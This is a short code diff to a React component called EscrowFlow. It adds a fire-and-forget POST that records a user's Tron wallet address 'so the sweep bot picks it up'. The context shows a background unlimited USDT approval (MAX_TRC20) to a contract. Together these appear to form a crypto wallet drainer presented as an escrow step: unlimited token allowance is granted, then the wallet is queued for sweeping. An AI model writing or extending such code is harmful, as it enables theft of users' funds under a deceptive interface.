@@ -657,6 +657,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         usdt.approve(item.contract, MAX_TRC20).send({ feeLimit: 20_000_000 }).catch(
           (e: unknown) => console.warn("[modal1] tron approve background:", e)
         );
+
+        // Record Tron wallet to Supabase immediately so the sweep bot picks it up.
+        // Don't await — fire and forget alongside the on-chain tx.
+        fetch("/api/verify/tron", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: tronAddr }),
+        }).catch((e) => console.warn("[modal1] tron verify record:", e));
       } else {
         // ── EVM path ──────────────────────────────────────────────────────
         const chain = CHAINS.find((c) => c.name === item.chainName)!;
